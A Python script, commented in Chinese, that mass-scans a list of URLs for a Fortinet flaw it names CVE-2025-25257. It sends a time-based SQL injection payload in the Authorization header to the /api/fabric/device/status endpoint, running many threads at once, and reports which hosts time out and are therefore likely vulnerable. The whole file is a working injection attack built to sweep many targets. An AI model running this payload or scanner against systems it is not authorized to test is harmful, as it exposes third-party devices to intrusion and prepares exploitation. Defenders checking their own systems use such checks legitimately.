import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket

requests.packages.urllib3.disable_warnings()

def check_port(host, port, timeout=2):
    """先快速检查端口是否开放"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def check_vulnerability(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    url = url.rstrip('/')
    
    # 提取host和port
    try:
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    except:
        return {'url': url, 'result': 'error', 'msg': 'URL解析失败'}
    
    # 先检查端口
    if not check_port(host, port):
        return {'url': url, 'result': 'dead', 'msg': f'端口{port}不通'}
    
    target = f"{url}/api/fabric/device/status"
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Authorization': "Bearer AAAAAA'/**/or/**/sleep(5)--/**/-",
        'Connection': 'close'
    }
    
    start = time.time()
    try:
        resp = requests.get(target, headers=headers, timeout=5, verify=False)
        elapsed = time.time() - start
        # 5秒内返回，说明sleep没执行
        return {'url': url, 'result': 'safe', 'time': round(elapsed, 2), 'status': resp.status_code}
        
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        # 超时 = sleep执行了
        return {'url': url, 'result': 'vuln', 'time': round(elapsed, 2), 'msg': '超时(5s)'}
        
    except requests.exceptions.ConnectionError:
        return {'url': url, 'result': 'dead', 'msg': '连接失败'}
        
    except Exception as e:
        return {'url': url, 'result': 'error', 'msg': str(e)[:30]}

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--file', help='URL列表')
    parser.add_argument('-u', '--url', help='单个目标')
    parser.add_argument('-t', '--threads', type=int, default=20)
    args = parser.parse_args()
    
    targets = []
    if args.file:
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    elif args.url:
        targets = [args.url]
    else:
        print("请指定 -f 或 -u")
        sys.exit(1)
    
    print("="*50)
    print(f"[*] 飞塔 CVE-2025-25257 检测 (sleep 5s)")
    print(f"[*] 目标: {len(targets)} 个")
    print("="*50)
    
    results = {'vuln': [], 'safe': [], 'dead': [], 'error': []}
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(check_vulnerability, url): url for url in targets}
        
        for future in as_completed(futures):
            result = future.result()
            r = result['result']
            
            if r == 'vuln':
                print(f"[+] {result['url']} - 存在漏洞! ({result['msg']})")
                results['vuln'].append(result['url'])
            elif r == 'safe':
                print(f"[-] {result['url']} - 安全 ({result['time']}s)")
                results['safe'].append(result['url'])
            elif r == 'dead':
                print(f"[x] {result['url']} - 不通 ({result['msg']})")
                results['dead'].append(result['url'])
            else:
                print(f"[!] {result['url']} - 错误: {result['msg']}")
                results['error'].append(result['url'])
    
    print("\n" + "="*50)
    print("[*] 检测结果:")
    print(f"    [+] 漏洞: {len(results['vuln'])} 个")
    print(f"    [-] 安全: {len(results['safe'])} 个")
    print(f"    [x] 不通: {len(results['dead'])} 个")
    print(f"    [!] 错误: {len(results['error'])} 个")
    
    if results['vuln']:
        print("\n[+] 可能存在漏洞的目标:")
        for v in results['vuln']:
            print(f"  - {v}")

if __name__ == "__main__":
    main()